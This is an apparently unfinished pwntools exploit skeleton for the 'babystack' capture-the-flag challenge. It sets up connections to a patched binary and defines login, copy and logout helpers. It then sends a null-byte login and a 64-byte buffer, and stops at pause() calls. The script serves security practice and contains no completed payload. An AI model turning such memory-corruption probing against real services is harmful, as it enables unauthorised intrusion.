#!/usr/bin/env python3

from pwn import *

exe = ELF("./babystack_patched", checksec = False)
libc = ELF("./libc_64.so.6", checksec = False)
ld = ELF("./ld-2.23.so",checksec = False)

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("addr", 1337)
        
    else:
        r = process([exe.path])

    return r
def login(password):
    r.sendlineafter(b'>> ', b'1')
    r.sendafter(b'Your passowrd :', password)
def copy(content):
    r.sendlineafter(b'>> ', b'3')
    r.sendlineafter(b'Copy :', content)
def logout():
    r.sendlineafter(b'>> ', b'2')
r = conn()
input()
login(b'\0')
# pause()
copy(b'A'*64)
pause()
r.sendlineafter(b'>> ', b'1')
pause()
# good luck pwning :)

r.interactive()
